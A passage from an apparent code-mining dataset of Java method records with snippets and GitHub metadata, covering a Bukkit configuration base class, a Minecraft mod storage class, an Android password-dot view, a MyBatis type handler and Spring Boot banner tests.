{"id": 33658, "method_name": "createDataMap", "class_name": "ConfigurationBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "DataMap", "snippet": "    public DataMap createDataMap(String path) {\n\n        return new YamlDataMap(getSafeConfigSection(path), this);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33659, "method_name": "getFile", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "    public File getFile() {\n\n        return file;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33660, "method_name": "getPlugin", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T getPlugin() {\n\n        return plugin;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33661, "method_name": "reload", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reload() {\n\n        load();\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33662, "method_name": "save", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void save() {\n\n        save(file);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33663, "method_name": "load", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void load() {\n\n        load(file);\n        loadAnnotations();\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33664, "method_name": "load", "class_name": "ConfigurationBase", "params": ["File"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void load(File file) {\n\n        try {\n            if (!file.exists() || file.length() == 0) {\n                copyFile();\n                save();\n            }\n            // load the config by calling the bukkit super method\n            super.load(file);\n            //            plugin.getLogger().info(\"[\" + plugin.getName() + \"] loaded config file \\\"\" +\n            // displayName + \"\\\" successfully.\");\n        } catch (IOException | InvalidConfigurationException e) {\n            plugin.getLogger().warning(e.getMessage());\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33665, "method_name": "loadAnnotations", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loadAnnotations() {\n\n        if (loadAnnotations(this)) save(file);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33666, "method_name": "loadAnnotations", "class_name": "ConfigurationBase", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean loadAnnotations(Object object) {\n\n        boolean foundAnnotations = false;\n        for (Field field : getFieldsRecur(object.getClass())) {\n            field.setAccessible(true);\n\n            try {\n                if (field.isAnnotationPresent(ConfigSubClass.class) && field.get(object) != null) {\n                    foundAnnotations = loadAnnotations(field.get(object));\n                } else if (field.isAnnotationPresent(Setting.class)) {\n\n                    String key = field.getAnnotation(Setting.class).value();\n                    if (Strings.isNullOrEmpty(key)) {\n                        key = field.getName();\n                    }\n                    final Object value = smartCast(field.getGenericType(), get(key));\n\n                    if (value != null) {\n                        field.set(object, value);\n                    } else {\n                        set(key, prepareSerialization(field.get(object)));\n                    }\n                    foundAnnotations = true;\n                }\n            } catch (IllegalAccessException e) {\n                plugin.getLogger().log(Level.SEVERE, \"Error setting configuration value of field: \", e);\n                e.printStackTrace();\n            }\n        }\n        return foundAnnotations;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33667, "method_name": "save", "class_name": "ConfigurationBase", "params": ["File"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void save(File file) {\n\n        try {\n            annos.clear();\n            saveAnnotations();\n            super.save(file);\n            commentPostProcess(file);\n        } catch (IOException e) {\n            plugin.getLogger().warning(e.getMessage());\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33668, "method_name": "saveAnnotations", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void saveAnnotations() {\n\n        saveAnnotations(this);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33669, "method_name": "saveAnnotations", "class_name": "ConfigurationBase", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void saveAnnotations(Object object) {\n\n        for (Field field : getFieldsRecur(object.getClass())) {\n            field.setAccessible(true);\n            try {\n                if (field.isAnnotationPresent(ConfigSubClass.class) && field.get(object) != null) {\n                    saveAnnotations(field.get(object));\n                } else if (field.isAnnotationPresent(Setting.class)) {\n                    String key = field.getAnnotation(Setting.class).value();\n                    if (Strings.isNullOrEmpty(key)) {\n                        key = field.getName();\n                    }\n                    onComment(key, field);\n                    set(key, prepareSerialization(field.get(object)));\n                }\n            } catch (IllegalAccessException e) {\n                plugin.getLogger().log(Level.SEVERE, \"Error setting configuration value of field: \", e);\n                e.printStackTrace();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33670, "method_name": "onComment", "class_name": "ConfigurationBase", "params": ["String", "Field"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onComment(String path, Field field) {\n\n        if (field.getAnnotation(Comment.class) != null) {\n            annos.put(path, new String[]{field.getAnnotation(Comment.class).value()});\n            return;\n        }\n        if (field.getAnnotation(MultiComment.class) != null) {\n            annos.put(path, field.getAnnotation(MultiComment.class).value());\n        }\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33671, "method_name": "level", "class_name": "ConfigurationBase", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int level(String path) {\n\n        int count = 0;\n        for (int i = 0; i < path.length(); i++) {\n            if (path.charAt(i) != ' ') {\n                break;\n            }\n            count++;\n        }\n        return count / 2;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33672, "method_name": "commentPostProcess", "class_name": "ConfigurationBase", "params": ["File"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void commentPostProcess(File file) throws IOException {\n\n        ArrayList<String> buffer = new ArrayList<String>();\n        BufferedReader reader = new BufferedReader(new FileReader(file));\n\n        String line;\n        while ((line = reader.readLine()) != null) {\n            buffer.add(line);\n        }\n        reader.close();\n        ArrayList<String> key = new ArrayList<String>();\n        int level;\n        String newKey;\n        String tmpKey;\n        int diff;\n        String[] comment;\n        BufferedWriter writer = new BufferedWriter(new FileWriter(file));\n        for (int i = 0; i < buffer.size(); i++) {\n            if (buffer.get(i).charAt(0) == '#') {\n                continue;\n            }\n            newKey = buffer.get(i).split(\":\")[0];\n            level = level(newKey);\n            newKey = newKey.trim();\n            if (level == 0) {\n                key.clear();\n            } else {\n                diff = key.size() - level;\n                for (int j = 0; j < diff; j++) {\n                    key.remove(key.size() - 1);\n                }\n                tmpKey = StringUtils.join(key, \".\");\n                tmpKey += \".\" + newKey;\n\n                if (annos.containsKey(tmpKey)) {\n                    comment = annos.get(tmpKey);\n                    for (int j = 0; j < comment.length; j++) {\n                        writer.write(\"# \" + comment[j]);\n                        writer.newLine();\n                    }\n                }\n            }\n            key.add(newKey);\n            writer.write(buffer.get(i));\n            writer.newLine();\n        }\n        writer.close();\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33673, "method_name": "getFieldsRecur", "class_name": "ConfigurationBase", "params": ["Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "List<Field>", "snippet": "    private List<Field> getFieldsRecur(Class<?> clazz) {\n\n        return getFieldsRecur(clazz, false);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33674, "method_name": "getFieldsRecur", "class_name": "ConfigurationBase", "params": ["Class<?>", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "List<Field>", "snippet": "    private List<Field> getFieldsRecur(Class<?> clazz, boolean includeObject) {\n\n        List<Field> fields = new ArrayList<>();\n        while (clazz != null && (includeObject || !Object.class.equals(clazz))) {\n\n            fields.addAll(Arrays.asList(clazz.getDeclaredFields()));\n            clazz = clazz.getSuperclass();\n        }\n        return fields;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33675, "method_name": "copyFile", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void copyFile() {\n\n        try {\n            // read the template file from the resources folder\n            InputStream stream = plugin.getResource(\"defaults/\" + name);\n            if (stream == null) {\n                plugin.getLogger().warning(\"There is no default config for \" + name);\n                file.createNewFile();\n                return;\n            }\n            Files.copy(stream, file.toPath(), StandardCopyOption.REPLACE_EXISTING);\n            plugin.getLogger().log(Level.INFO, \"Copied default config: \" + name);\n        } catch (IOException iex) {\n            plugin.getLogger().log(Level.WARNING, \"could not create default config: \" + name, iex);\n        }\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33676, "method_name": "getInt", "class_name": "ConfigurationBase", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getInt(String path, int def) {\n\n        if (!isSet(path)) {\n            set(path, def);\n            if (isSaveDefaults()) save();\n        } else {\n            return super.getInt(path, def);\n        }\n        return getInt(path);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33677, "method_name": "getString", "class_name": "ConfigurationBase", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getString(String path, String def) {\n\n        if (def == null) return super.getString(path, null);\n        if (!isSet(path)) {\n            set(path, def);\n            if (isSaveDefaults()) save();\n        } else {\n            return super.getString(path, def);\n        }\n        return getString(path);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33678, "method_name": "getBoolean", "class_name": "ConfigurationBase", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean getBoolean(String path, boolean def) {\n\n        if (!isSet(path)) {\n            set(path, def);\n            if (isSaveDefaults()) save();\n        } else {\n            return super.getBoolean(path, def);\n        }\n        return getBoolean(path);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33679, "method_name": "getDouble", "class_name": "ConfigurationBase", "params": ["String", "double"], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getDouble(String path, double def) {\n\n        if (!isSet(path)) {\n            set(path, def);\n            if (isSaveDefaults()) save();\n        } else {\n            return super.getDouble(path, def);\n        }\n        return getDouble(path);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33680, "method_name": "getLong", "class_name": "ConfigurationBase", "params": ["String", "long"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getLong(String path, long def) {\n\n        if (!isSet(path)) {\n            set(path, def);\n            if (isSaveDefaults()) save();\n        } else {\n            return super.getLong(path, def);\n        }\n        return getLong(path);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33681, "method_name": "getLiving", "class_name": "EVEStorageLiving", "params": [], "throws": null, "modifiers": ["public"], "return_type": "EntityLivingBase", "snippet": "    public EntityLivingBase getLiving() {\n        return living;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33682, "method_name": "getEVE", "class_name": "EVEStorageLiving", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Eve", "snippet": "    public Eve getEVE() {\n        NBTTagCompound tag = living.getEntityData();\n        return tag.hasKey(TAG_EVE) ?\n                DataHelper.loadEVEfromNBT(tag) :\n                new Eve(0, getCapacity(), getHueRange().getMid(), getBrightnessRange().getMid(), 0);\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33683, "method_name": "setEVE", "class_name": "EVEStorageLiving", "params": ["Eve"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEVE(Eve incoming) {\n        living.getEntityData().setTag(TAG_EVE, incoming.writeToNBT());\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33684, "method_name": "blendEVE", "class_name": "EVEStorageLiving", "params": ["Eve", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "Eve", "snippet": "    public Eve blendEVE(Eve incoming, boolean simulate) {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33685, "method_name": "getHueRange", "class_name": "EVEStorageLiving", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Range", "snippet": "    public Range getHueRange() {\n        return hueRange;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33686, "method_name": "getBrightnessRange", "class_name": "EVEStorageLiving", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Range", "snippet": "    public Range getBrightnessRange() {\n        return brightnessRange;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33687, "method_name": "canBlend", "class_name": "EVEStorageLiving", "params": ["Eve"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canBlend(Eve incoming) {\n        return getHueRange().in(incoming.getHue()) && getBrightnessRange().in(incoming.getBrightness());\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33688, "method_name": "hasCapability", "class_name": "EVEStorageLiving", "params": ["Capability<?>", "EnumFacing"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasCapability(@Nonnull Capability<?> capability, @Nullable EnumFacing facing) {\n        return capability == CapabilityEVE.EVE_ENTITY;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33689, "method_name": "getCapability", "class_name": "EVEStorageLiving", "params": ["Capability<T>", "EnumFacing"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T getCapability(@Nonnull Capability<T> capability, @Nullable EnumFacing facing) {\n        return capability == CapabilityEVE.EVE_ENTITY ? (T) this : null;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33690, "method_name": "serializeNBT", "class_name": "EVEStorageLiving", "params": [], "throws": null, "modifiers": ["public"], "return_type": "NBTTagCompound", "snippet": "    public NBTTagCompound serializeNBT() {\n        return getEVE().writeToNBT();\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33691, "method_name": "deserializeNBT", "class_name": "EVEStorageLiving", "params": ["NBTTagCompound"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deserializeNBT(NBTTagCompound nbt) {\n        setEVE(getEVE().readFromNBT(nbt));\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33692, "method_name": "getCapacity", "class_name": "EVEStorageLiving", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCapacity() {\n        return capacity;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorageLiving.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorageEntity", "ICapabilityProvider", "INBTSerializable"], "modifiers": ["public"]}}, {"id": 33693, "method_name": "onMeasure", "class_name": "PasswordView", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        switch (MeasureSpec.getMode(widthMeasureSpec)) {\n            case MeasureSpec.AT_MOST:\n            case MeasureSpec.UNSPECIFIED:\n                widthMeasureSpec = MeasureSpec.makeMeasureSpec(mItemWidth * PASSWORD_COUNT, MeasureSpec.EXACTLY);\n                break;\n            case MeasureSpec.EXACTLY:\n            default:\n                break;\n        }\n\n        switch (MeasureSpec.getMode(heightMeasureSpec)) {\n            case MeasureSpec.AT_MOST:\n            case MeasureSpec.UNSPECIFIED:\n                heightMeasureSpec = MeasureSpec.makeMeasureSpec(mItemHeight, MeasureSpec.EXACTLY);\n                break;\n            case MeasureSpec.EXACTLY:\n            default:\n                break;\n        }\n\n        setMeasuredDimension(widthMeasureSpec, heightMeasureSpec);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/PasswordView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33694, "method_name": "onDraw", "class_name": "PasswordView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        mPaint.setStrokeWidth(5);\n        canvas.drawPath(mPath, mPaint);\n\n        // \u753b\u5355\u4e2a\u7684\u5206\u5272\u7ebf\n        mPaint.setStrokeWidth(3);\n        for (int index = 1; index < PASSWORD_COUNT; index++) {\n            canvas.drawLine(mItemWidth * index, 0, mItemWidth * index, mItemHeight, mPaint);\n        }\n\n        // \u7ed8\u5236\u4e2d\u95f4\u7684\u5c0f\u9ed1\u70b9\n        if (mCurrentIndex == 0) {\n            return;\n        }\n        for (int i = 1; i <= mCurrentIndex; i++) {\n            canvas.drawCircle(i * mItemWidth - (float) mItemWidth / 2, (float) mItemHeight / 2, POINT_RADIUS, mPointPaint);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/PasswordView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33695, "method_name": "setPassWordLength", "class_name": "PasswordView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPassWordLength(int index) {\n        mCurrentIndex = index;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/PasswordView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33696, "method_name": "setNonNullParameter", "class_name": "LongTypeHandler", "params": ["PreparedStatement", "int", "Long", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, Long parameter, JdbcType jdbcType)\n      throws SQLException {\n    ps.setLong(i, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LongTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33697, "method_name": "getNullableResult", "class_name": "LongTypeHandler", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getNullableResult(ResultSet rs, String columnName)\n      throws SQLException {\n    long result = rs.getLong(columnName);\n    return result == 0 && rs.wasNull() ? null : result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LongTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33698, "method_name": "getNullableResult", "class_name": "LongTypeHandler", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getNullableResult(ResultSet rs, int columnIndex)\n      throws SQLException {\n    long result = rs.getLong(columnIndex);\n    return result == 0 && rs.wasNull() ? null : result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LongTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33699, "method_name": "getNullableResult", "class_name": "LongTypeHandler", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getNullableResult(CallableStatement cs, int columnIndex)\n      throws SQLException {\n    long result = cs.getLong(columnIndex);\n    return result == 0 && cs.wasNull() ? null : result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LongTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33700, "method_name": "cleanUp", "class_name": "BannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid cleanUp() {\n\t\tif (this.context != null) {\n\t\t\tthis.context.close();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33701, "method_name": "setup", "class_name": "BannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid setup() {\n\t\tMockitoAnnotations.initMocks(this);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33702, "method_name": "testDefaultBanner", "class_name": "BannerTests", "params": ["CapturedOutput"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testDefaultBanner(CapturedOutput output) {\n\t\tSpringApplication application = createSpringApplication();\n\t\tthis.context = application.run();\n\t\tassertThat(output).contains(\":: Spring Boot ::\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33703, "method_name": "testDefaultBannerInLog", "class_name": "BannerTests", "params": ["CapturedOutput"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testDefaultBannerInLog(CapturedOutput output) {\n\t\tSpringApplication application = createSpringApplication();\n\t\tthis.context = application.run();\n\t\tassertThat(output).contains(\":: Spring Boot ::\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33704, "method_name": "testCustomBanner", "class_name": "BannerTests", "params": ["CapturedOutput"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testCustomBanner(CapturedOutput output) {\n\t\tSpringApplication application = createSpringApplication();\n\t\tapplication.setBanner(new DummyBanner());\n\t\tthis.context = application.run();\n\t\tassertThat(output).contains(\"My Banner\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33705, "method_name": "testBannerInContext", "class_name": "BannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testBannerInContext() {\n\t\tSpringApplication application = createSpringApplication();\n\t\tthis.context = application.run();\n\t\tassertThat(this.context.containsBean(\"springBootBanner\")).isTrue();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33706, "method_name": "testCustomBannerInContext", "class_name": "BannerTests", "params": [], "throws": null, "modifiers": 